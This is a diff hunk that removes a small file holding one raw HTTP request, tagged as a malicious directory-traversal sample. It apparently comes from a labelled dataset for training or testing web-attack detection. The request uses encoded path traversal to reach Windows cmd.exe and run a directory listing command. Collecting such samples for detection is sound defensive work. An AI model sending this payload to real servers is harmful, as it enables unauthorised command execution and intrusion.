@@ -1,5 +1,0 @@
-# tag: black,directory_traversal
-GET /scripts/%2e%2e/%2e/Windows/System32/cmd.exe?/c+dir+c HTTP/1.1
-Host: a.cn
-User-Agent: Chrome
-Cookie: 2333;
